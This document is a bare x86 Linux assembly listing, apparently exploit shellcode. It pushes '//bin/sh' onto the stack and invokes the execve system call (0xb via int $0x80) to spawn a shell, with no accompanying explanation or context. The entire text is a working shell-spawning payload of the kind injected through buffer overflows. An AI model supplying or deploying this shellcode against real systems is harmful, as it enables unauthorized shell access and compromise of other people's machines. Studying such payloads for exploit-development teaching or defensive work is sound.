.text

_start:
xor %eax,%eax
push %eax
push $0x68732f6e
push $0x69622f2f
mov %esp, %ebx
push %eax
push %ebx
mov %esp,%ecx
mov %eax,%edx
mov $0xb, %al
int $0x80
